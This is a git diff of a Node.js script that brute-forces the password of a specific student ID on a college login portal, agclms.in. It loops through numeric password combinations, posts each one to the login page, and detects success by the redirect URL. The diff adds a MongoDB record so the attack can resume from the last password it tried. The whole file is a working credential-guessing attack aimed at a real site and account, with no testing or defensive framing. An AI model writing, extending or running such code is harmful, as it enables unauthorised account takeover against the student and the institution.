@@ -3,18 +3,20 @@ import mongoose from "mongoose";
 import dotenv from "dotenv";
 import express from "express";
 import fetch from "node-fetch";
+import DBTrack from "./DBTrackSchema.js";
 
 dotenv.config({ path: "./.env" });
 
 const app = express();
 const port = 3000;
 
-let i;
 let isInitiated;
-const username = 2412232;
+const username = 2412800;
 const fail_url = "https://agclms.in/Elogin/StudentLogin";
 const succ_url = "https://agclms.in/DashBoardStudent";
-let totalDigit = 3;
+let totalDigit = 1;
+
+const currentTrackId = "massu";
 
 async function connectDB() {
   if (mongoose.connection.readyState === 0) {
@@ -23,10 +25,39 @@ async function connectDB() {
   }
 }
 
-app.get("/", (req, res) => {
-  if (isInitiated) return res.send(`Initiated, current check ${i}`);
+app.get("/", async (req, res) => {
+  let str;
+  if (isInitiated) return res.send(`Initiated, ${str}`);
   isInitiated = true;
-  main();
+
+  await connectDB();
+
+  const isTracks = await DBTrack.findOne({ trackId: currentTrackId });
+
+  if (isTracks) {
+    console.log("track found : ", isTracks);
+
+    totalDigit = isTracks.digiTrack;
+    str = isTracks.passTrack;
+  } else {
+    console.log("track not found");
+
+    const newTrack = new DBTrack({
+      trackId: currentTrackId,
+      passTrack: "0",
+      digiTrack: 1,
+    });
+
+    await newTrack.save();
+
+    console.log(`no past track for ${currentTrackId}, fresh track made`);
+    str = "0";
+    totalDigit = 1;
+  }
+
+  console.log(`initiated with pass : ${str}, digi : ${totalDigit}`);
+
+  main(str);
   res.send("Initiated");
 });
 
@@ -54,9 +85,8 @@ function nextComb(str) {
   return arr.join("");
 }
 
-const main = async () => {
+const main = async (str) => {
   try {
-    let str = "999";
 
     for (let i = 0; i < 10000; i++) {
       const response = await fetch("https://agclms.in/Elogin/StudentLogin", {
@@ -84,6 +114,18 @@ const main = async () => {
       } else {
         console.error("Unexpected URL:", response.url);
         return;
+      }
+
+      try {
+        await connectDB();
+        const oldTrack = await DBTrack.findOne({ trackId: currentTrackId });
+
+        oldTrack.passTrack = str;
+        oldTrack.digiTrack = totalDigit;
+
+        await oldTrack.save();
+      } catch {
+        console.log(`DB error while saving track : ${str}, ${currentTrackId}`);
       }
 
       str = nextComb(str);
